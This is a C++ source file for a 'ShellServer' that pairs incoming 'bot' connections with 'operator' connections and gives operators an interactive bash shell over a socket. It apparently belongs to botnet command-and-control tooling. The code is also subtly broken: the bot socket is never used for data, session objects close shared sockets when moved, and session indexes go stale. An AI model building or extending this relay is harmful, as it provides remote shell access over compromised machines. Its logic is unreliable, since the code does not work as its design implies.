#include "shell_server.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pty.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/wait.h>
#include <signal.h>
#include <cstring>
#include <vector>
#include <atomic>

ShellServer::ShellServer(int bot_port, int op_port)
    : bot_port_(bot_port), op_port_(op_port), waiting_bot_sock_(-1), running_(false) {}

ShellServer::~ShellServer() {
    stop();
}

void ShellServer::start() {
    running_ = true;
    std::cout << "[SHELL] Starting shell server..." << std::endl;
    
    try {
        std::thread bot_listener(&ShellServer::listener_thread, this, bot_port_, true);
        std::thread op_listener(&ShellServer::listener_thread, this, op_port_, false);
        
        // Wait for both threads
        if (bot_listener.joinable()) bot_listener.join();
        if (op_listener.joinable()) op_listener.join();
        
    } catch (const std::exception& e) {
        std::cerr << "[SHELL] Error starting server: " << e.what() << std::endl;
        running_ = false;
    }
}

void ShellServer::stop() {
    if (!running_) return;
    
    running_ = false;
    
    // Clean up any waiting connections
    {
        std::lock_guard<std::mutex> lock(mtx_);
        if (waiting_bot_sock_ != -1) {
            close(waiting_bot_sock_);
            waiting_bot_sock_ = -1;
        }
    }
    
    cv_.notify_all();
    
    // Clean up active sessions
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        for (auto& session : active_sessions_) {
            session.stop();
        }
        active_sessions_.clear();
    }
}

void ShellServer::listener_thread(int port, bool is_bot_listener) {
    int listener_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listener_fd == -1) {
        std::cerr << "[SHELL] Failed to create socket for port " << port << std::endl;
        return;
    }
    
    // Set socket options
    int optval = 1;
    setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    // Set socket timeout
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);
    
    if (bind(listener_fd, (sockaddr*)&address, sizeof(address)) < 0) {
        std::cerr << "[SHELL] Failed to bind to port " << port << std::endl;
        close(listener_fd);
        return;
    }
    
    if (listen(listener_fd, 5) < 0) {
        std::cerr << "[SHELL] Failed to listen on port " << port << std::endl;
        close(listener_fd);
        return;
    }
    
    std::cout << "[SHELL] Listening on port " << port << "..." << std::endl;

    while (running_) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(listener_fd, &read_fds);
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int activity = select(listener_fd + 1, &read_fds, nullptr, nullptr, &tv);
        if (activity < 0 && errno != EINTR) {
            break;
        }
        
        if (activity > 0 && FD_ISSET(listener_fd, &read_fds)) {
            int new_socket = accept(listener_fd, nullptr, nullptr);
            if (new_socket >= 0) {
                handle_new_connection(new_socket, is_bot_listener);
            }
        }
    }
    
    close(listener_fd);
    std::cout << "[SHELL] Listener thread for port " << port << " stopped" << std::endl;
}

void ShellServer::handle_new_connection(int socket_fd, bool is_bot_connection) {
    if (is_bot_connection) {
        std::cout << "[SHELL] Bot connected. Waiting for operator..." << std::endl;
        
        std::unique_lock<std::mutex> lock(mtx_);
        if (waiting_bot_sock_ != -1) {
            close(waiting_bot_sock_); // Close previous waiting bot
        }
        waiting_bot_sock_ = socket_fd;
        cv_.notify_one();
        
    } else {
        std::cout << "[SHELL] Operator connected. Looking for available bot..." << std::endl;
        
        std::unique_lock<std::mutex> lock(mtx_);
        auto timeout = std::chrono::steady_clock::now() + std::chrono::seconds(30);
        
        if (cv_.wait_until(lock, timeout, [this]{ return waiting_bot_sock_ != -1 || !running_; })) {
            if (running_ && waiting_bot_sock_ != -1) {
                int bot_sock = waiting_bot_sock_;
                waiting_bot_sock_ = -1;
                lock.unlock();
                
                // Create new session
                create_shell_session(bot_sock, socket_fd);
            } else {
                close(socket_fd);
            }
        } else {
            std::cout << "[SHELL] Operator connection timed out waiting for bot" << std::endl;
            close(socket_fd);
        }
    }
}

void ShellServer::create_shell_session(int bot_sock, int op_sock) {
    try {
        ShellSession session(bot_sock, op_sock);
        
        {
            std::lock_guard<std::mutex> lock(sessions_mutex_);
            active_sessions_.push_back(std::move(session));
        }
        
        // Start session in detached thread
        std::thread session_thread(&ShellServer::run_shell_session, this, active_sessions_.size() - 1);
        session_thread.detach();
        
        std::cout << "[SHELL] New shell session created" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[SHELL] Failed to create session: " << e.what() << std::endl;
        close(bot_sock);
        close(op_sock);
    }
}

void ShellServer::run_shell_session(size_t session_index) {
    try {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        if (session_index < active_sessions_.size()) {
            active_sessions_[session_index].run();
        }
    } catch (const std::exception& e) {
        std::cerr << "[SHELL] Session error: " << e.what() << std::endl;
    }
    
    // Clean up session
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        if (session_index < active_sessions_.size()) {
            active_sessions_.erase(active_sessions_.begin() + session_index);
        }
    }
}

// ShellSession Implementation
ShellSession::ShellSession(int bot_sock, int op_sock) 
    : bot_socket_(bot_sock), op_socket_(op_sock), pty_master_(-1), child_pid_(-1), active_(true) {
    
    // Set socket timeouts
    struct timeval timeout;
    timeout.tv_sec = 30;
    timeout.tv_usec = 0;
    setsockopt(bot_socket_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(op_socket_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
}

ShellSession::~ShellSession() {
    stop();
}

void ShellSession::run() {
    if (!create_pty()) {
        std::cerr << "[SHELL] Failed to create PTY for session" << std::endl;
        return;
    }
    
    std::cout << "[SHELL] Shell session started (PID: " << child_pid_ << ")" << std::endl;
    
    try {
        // Start data forwarding threads
        std::thread op_to_pty_thread(&ShellSession::forward_op_to_pty, this);
        std::thread pty_to_op_thread(&ShellSession::forward_pty_to_op, this);
        
        // Wait for session to end
        op_to_pty_thread.join();
        pty_to_op_thread.join();
        
    } catch (const std::exception& e) {
        std::cerr << "[SHELL] Session thread error: " << e.what() << std::endl;
    }
    
    std::cout << "[SHELL] Shell session ended" << std::endl;
}

void ShellSession::stop() {
    active_ = false;
    
    if (pty_master_ != -1) {
        close(pty_master_);
        pty_master_ = -1;
    }
    
    if (bot_socket_ != -1) {
        close(bot_socket_);
        bot_socket_ = -1;
    }
    
    if (op_socket_ != -1) {
        close(op_socket_);
        op_socket_ = -1;
    }
    
    if (child_pid_ > 0) {
        kill(child_pid_, SIGTERM);
        
        // Wait for child to exit
        int status;
        if (waitpid(child_pid_, &status, WNOHANG) == 0) {
            // Child didn't exit, force kill
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            kill(child_pid_, SIGKILL);
            waitpid(child_pid_, &status, 0);
        }
        child_pid_ = -1;
    }
}

bool ShellSession::create_pty() {
    char slave_name[256];
    
    // Create master PTY
    pty_master_ = posix_openpt(O_RDWR | O_NOCTTY);
    if (pty_master_ == -1) {
        return false;
    }
    
    // Grant access to slave PTY
    if (grantpt(pty_master_) == -1) {
        close(pty_master_);
        pty_master_ = -1;
        return false;
    }
    
    // Unlock slave PTY
    if (unlockpt(pty_master_) == -1) {
        close(pty_master_);
        pty_master_ = -1;
        return false;
    }
    
    // Get slave PTY name
    if (ptsname_r(pty_master_, slave_name, sizeof(slave_name)) != 0) {
        close(pty_master_);
        pty_master_ = -1;
        return false;
    }
    
    // Fork child process
    child_pid_ = fork();
    if (child_pid_ == -1) {
        close(pty_master_);
        pty_master_ = -1;
        return false;
    }
    
    if (child_pid_ == 0) {
        // Child process
        
        // Create new session
        if (setsid() == -1) {
            exit(1);
        }
        
        // Open slave PTY
        int slave_fd = open(slave_name, O_RDWR);
        if (slave_fd == -1) {
            exit(1);
        }
        
        // Set controlling terminal
        if (ioctl(slave_fd, TIOCSCTTY, 0) == -1) {
            exit(1);
        }
        
        // Redirect stdin, stdout, stderr
        dup2(slave_fd, STDIN_FILENO);
        dup2(slave_fd, STDOUT_FILENO);
        dup2(slave_fd, STDERR_FILENO);
        
        if (slave_fd > STDERR_FILENO) {
            close(slave_fd);
        }
        
        // Set environment
        setenv("TERM", "xterm-256color", 1);
        setenv("PS1", "\\u@\\h:\\w$ ", 1);
        
        // Execute shell
        execl("/bin/bash", "/bin/bash", "-i", nullptr);
        
        // If exec fails, try other shells
        execl("/bin/sh", "/bin/sh", "-i", nullptr);
        exit(1);
    }
    
    // Parent process continues with pty_master_
    return true;
}

void ShellSession::forward_op_to_pty() {
    char buffer[4096];
    
    while (active_) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(op_socket_, &read_fds);
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int activity = select(op_socket_ + 1, &read_fds, nullptr, nullptr, &tv);
        if (activity < 0) break;
        if (activity == 0) continue; // Timeout
        
        if (FD_ISSET(op_socket_, &read_fds)) {
            int bytes_read = recv(op_socket_, buffer, sizeof(buffer), 0);
            if (bytes_read <= 0) break;
            
            if (write(pty_master_, buffer, bytes_read) != bytes_read) {
                break;
            }
        }
    }
    
    active_ = false;
}

void ShellSession::forward_pty_to_op() {
    char buffer[4096];
    
    while (active_) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(pty_master_, &read_fds);
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int activity = select(pty_master_ + 1, &read_fds, nullptr, nullptr, &tv);
        if (activity < 0) break;
        if (activity == 0) continue; // Timeout
        
        if (FD_ISSET(pty_master_, &read_fds)) {
            int bytes_read = read(pty_master_, buffer, sizeof(buffer));
            if (bytes_read <= 0) break;
            
            if (send(op_socket_, buffer, bytes_read, 0) != bytes_read) {
                break;
            }
        }
    }
    
    active_ = false;
}
